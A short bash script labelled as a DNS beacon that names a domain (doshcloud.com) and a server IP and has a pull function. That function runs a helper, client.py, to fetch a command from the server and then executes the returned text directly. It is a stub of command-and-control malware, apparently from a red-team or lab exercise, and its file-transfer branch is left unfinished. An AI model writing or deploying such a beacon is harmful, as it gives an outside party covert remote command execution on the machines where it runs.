#!/bin/bash
# Beacon to DNS server 

domain="doshcloud.com"
dnsServer="129.21.130.212"
f=false

# Pull down commands from server
pull(){

    cmd=$(python client.py)
    first=$(echo $cmd | awk '{print $1}')
    if [[ $first == "file" ]]; then
        f=true
    else
        $cmd
    fi
}

# Main driver for beacon
main(){
    pull
}

main
